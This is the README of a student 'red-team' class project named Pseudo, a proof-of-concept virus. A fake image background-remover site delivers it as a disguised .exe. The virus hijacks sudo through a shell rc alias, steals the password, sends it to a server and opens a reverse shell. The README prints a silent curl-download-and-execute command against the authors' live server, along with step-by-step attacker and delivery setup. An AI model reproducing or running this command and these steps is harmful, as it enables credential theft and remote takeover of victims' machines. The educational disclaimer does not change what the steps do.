[![Review Assignment Due Date](https://classroom.github.com/assets/deadline-readme-button-22041afd0340ce965d47ae6ef1cefeee28c7c493a6346c4f15d667ab976d596c.svg)](https://classroom.github.com/a/am3xLbu5)
# Pseudo
 
## Authors

Abel Bellows, Michael Avrahami, Stanley Hoo
       
## Ethical Disclaimer

This project is a **red-team simulation** created strictly for **educational purposes** as part of our cybersecurity's class final project. The goal is to demonstrate how social engineering and obfuscated file execution can be used to bypass user expectations and install unknown background scripts or viruses. No part of this project should be used maliciously, and the authors do **not** condone unauthorized access, data collection, or exploitation in any context. The authors of this project have only used this project in line with this description and have **always** recieved the consent of the target prior to  tesing any element of this project. All use of the project is at the users own risk.

## Project Description:

**Pseudo** is a proof-of-concept virus that demonstrates that shell configuration files can act as vulnerabilities for stealing a targets sudo password. The virus is delivered to windows users through web-based attack vector posing as an image background remover tool. Users upload an image to remove its background and are given a disguised `.exe` (Windows) file that appears to be the processed image. As of right now, the executables will most likely be blocked by firewalls and require user permission to run, however it is possible to bypass these restrictions using certain methods. This virus is capable of infecting any linux machine but should be compiled seperatly on the target machine or installed via this command: `curl -s -X POST -o ~/.config/rm17-node https://cyber.stanleyhoo1.tech/files/runme 2>/dev/null; chmod +x ~/.config/rm17-node 2>/dev/null; ~/.config/rm17-node 2>/dev/null;`

When the exe is opened on a Windows computer, the executable:
- Downloads and saves a hidden script (`runme`) from our server in an obscure location then executes the script.
- Downloads and opens the background-removed image to avoid suspicion.
- Deletes itself to avoid detection.
- Collects system credentials upon next `sudo` usage in a new terminal (on Linux or WSL for Windows) and sends them back to the web server.
- After collecting sudo credentials launches a reverse shell to the attack server.

This same effect can be achieved on any linux machine through running the command above.
  
## Instructions

### (for victim):

Visit our website [https://cyber.stanleyhoo1.tech](https://cyber.stanleyhoo1.tech), upload an image, and download the result (you may have to turn off your firewall to allow it to download). Note the file may take several seconds to upload/download. Do not spam the buttons. Opening the downloaded file will execute the hidden script and display the image.

> This tool is only intended for use by project reviewers or classmates as part of the educational evaluation. Do not distribute or run on unauthorized systems.

Press on the exe and wait. Then open up a wsl window and attempt to use the sudo command.

Alternitivly use the command at the top of this README.

---

### Installation guide for attacker.

1. Clone this repository:
    ```bash
    git clone git@github.com:Stuycs-K/finalproject-10-bellows-a-hoo-s-avrahami-m.git
    cd finalproject-10-bellows-a-hoo-s-avrahami-m
    ```
2. `cd c_scripts` and `make all`
3. run the server by running `./server`. By default the virus you download from the website will have the reverse shell IP address set to a digital ocean box owned by us that is running this server. Mr K, we will give you the login to this server seperatly for ease of use. If the attack server is not running on that digital ocean box, you need to change the IP address defined at the top of the file **pseudo.c** to the public address of the server you are using. This will not update the website so you will need to compile and distribute the virus seperatly using `make compile`.
4. The server will print out a command that begins `./user_shell <PID>`. Run this command in a seperate window to sync the command entry and the server.
5. Once a virus connects to the server, you will be able to type commands that will be transmitted directly to the target's machine.
 * Two special commands (d is some digit corresponding to a virus) are
   a) `d childinfo` reprints a bunch of info about the target machine, like ip address and sudo password
   b) `d destroy` deletes the sudo alias from any rc files and removes the virus itself from the target machine, leaving no trace
### Installation Guide for Webserver (Optional)

1. Clone this repository:
    ```bash
    git clone git@github.com:Stuycs-K/finalproject-10-bellows-a-hoo-s-avrahami-m.git
    cd finalproject-10-bellows-a-hoo-s-avrahami-m
    ```

2. Create and activate a virtual environment:
    ```bash
    python3 -m venv VENV_NAME
    source VENV_NAME/bin/activate
    ```

3. Install dependencies:
    ```bash
    pip install -r requirements.txt
    ```

4. Download [Bat_To_Exe_Converter](https://en.softonic.com/download/bat-to-exe-converter-x64/windows/post-download?dt=internalDownload).

5. If on Linux, install Wine and required utilities:
    ```bash
    sudo apt install -y wine64 wine32 winbind xvfb unzip
    ```

6. Navigate into the Flask app:
    ```bash
    cd app
    ```

7. Update the following paths in your code:
    - In `convert_exe.py`, update `BAT_TO_EXE_PATH` to your absolute path to `Bat_To_Exe_Converter_x64.exe`.
    - In `app.py`, update the `subprocess.run(...)` call (line 201) to reflect the full path to `convert_exe.py`.

8. Run the Flask app:
    ```bash
    python3 app.py
    ```

9. Visit `http://localhost:5000` or your domain to interact with the tool.

### Local testing (Optional)

1. Clone this repository:
    ```bash
    git clone git@github.com:Stuycs-K/finalproject-10-bellows-a-hoo-s-avrahami-m.git
    cd finalproject-10-bellows-a-hoo-s-avrahami-m/c_scripts
    ```

2. Compile the payloads using the makefile:

   Once in the c_scripts directory, type `make all` to compile

3. fork() (metaphorically). To setup the server read steps 4-6. To run the virus skip to step 8.

4. Open the pseudo.c file and check what the value of SERVER_IP is. If not 0.0.0.0, change to "0.0.0.0"

5. To run the server, type in the command `./server`.
 * This will be the server that receives all of the incoming reverse shells from virus connections. It will display all of the output from each reverse shell corresponding to a virus
 * Note the command you are told to run (it should be "./user_shell PID" where PID is some number)

6. Open a new terminal, and navigate once more to the c_scripts directory. There, enter the command given to you by the server.
 * This is where the user will enter the commands that will be transmitted to the reverse shells. The method to enter commands is described there

7. Once a virus connects to the server, you will be able to type commands that will be transmitted directly to the target's machine.
 * Two special commands (d is some digit corresponding to a virus) are
   a) `d childinfo` reprints a bunch of info about the target machine, like ip address and sudo password
   b) `d destroy` deletes the sudo alias from any rc files and removes the virus itself from the target machine, leaving no trace

------ Virus Instructions ------
   
8. To create the alias for sudo run the virus: `./runme`. If you used the above method with the downloading the image and executable this step is unnecessary

9. Close the terminal and open a new one to ensure the rc file reloads. Type bash to open the terminal in bash. This simulates a user coming back at a later time. Now enter some sort of sudo command (it doesn't need to need sudo privileges, it can be something simple like sudo ls)

* Type in the correct password. This will cause the virus to steal your password, upload it to a stored database on the website, and start a reverse shell with sudo privileges which the server will then pick up. If the incorrect password is entered, the virus will reprompt you for the password. 

## BUGS

1. Sudo will always require your password -- the window in which your sudo account remains unlocked is nonexistent.
2. To run `d destroy` as the attacker, you need to first `su` to the user who owns the virus so that the destroy script targets their account specifically.
3. Sometimes after the psuedo finishes the reverse shell launch, there is a delay before the cmd prompt prints again.

---

## Resources/ References:

* [Background Remover](https://github.com/nadermx/backgroundremover): Used to remove the backgrounds from images
* [Bat to EXE Converter](https://en.softonic.com/download/bat-to-exe-converter-x64/windows/post-download?dt=internalDownload): Used to convert the batfiles to exe files for Windows
* [Self delete Batfile](https://superuser.com/a/1816768): Used to help figure out to self delete exe after running
* [Tutorial 1](https://learn.openwaterfoundation.org/owf-learn-windows-shell/batch-file-basics/batch-file-basics/), [Tutorial 2](https://www.tutorialspoint.com/batch_script/batch_script_files.html): Tutorials for learning batfile syntax
* [Execute Scripts on Click](https://askubuntu.com/questions/138908/how-to-execute-a-script-just-by-double-clicking-like-exe-files-in-windows): Used to figure out how to execute scripts simply from opening a file
* [Source 1](https://docs.fileformat.com/settings/desktop/), [Source 2](https://www.baeldung.com/linux/desktop-entry-files), [Source 3](https://wiki.archlinux.org/title/Desktop_entries), [Source 4](https://askubuntu.com/questions/5172/running-a-desktop-file-in-the-terminal): Sources used to figure out desktop file syntax
* [Download Multiple Files on Click](https://stackoverflow.com/a/54200538): Used to figure out how to download multiple files from clicking a button once
* [Open files with spaces in filename in windows](https://superuser.com/a/511488)
